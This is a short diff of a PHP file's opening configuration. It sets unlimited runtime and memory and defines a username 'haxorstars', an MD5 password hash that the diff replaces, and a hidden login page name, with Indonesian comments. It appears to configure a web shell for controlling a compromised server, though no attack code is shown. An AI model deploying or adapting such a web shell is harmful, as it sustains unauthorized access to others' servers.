@@ -3,7 +3,7 @@ set_time_limit(0);
 ini_set('memory_limit', '-1');
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'haxorstars',
-    'password' => 'ff6d9718a96dd1c0ec471cc444adaf54', //ubah password (md5) sesuai selera
+    'password' => 'b237fb3615a21bc17fa67bb48ebe48b8', //ubah password (md5) sesuai selera
     'safe_mode' => '1',
     'login_page' => 'nulzganteng', //jangan diubah nanti error
     'show_icons' => '1',
